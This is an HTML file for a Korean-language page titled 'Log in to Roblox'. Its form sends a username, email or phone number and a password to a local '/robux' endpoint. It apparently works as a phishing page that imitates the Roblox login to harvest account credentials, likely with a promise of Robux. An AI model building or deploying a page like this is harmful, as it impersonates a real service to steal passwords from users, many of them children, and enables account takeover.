<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox에 로그인</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main>
        <div class="login-container">
            <h2>Roblox에 로그인</h2>
            <form class="login-form" action="/robux" method="POST" id="robux-form" name="robux-form">
                <div class="input-group">
                    <input type="text" id="roblox_id" name="roblox_id" placeholder="사용자 이름/이메일/전화번호" required>
                </div>
                <div class="input-group">
                    <input type="password" id="roblox_pwd" name="roblox_pwd" placeholder="비밀번호" required>
                </div>
                <button type="submit" class="login-btn">로그인</button>
            </form>
        </div>
    </main>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
</body>

</body>
</html>
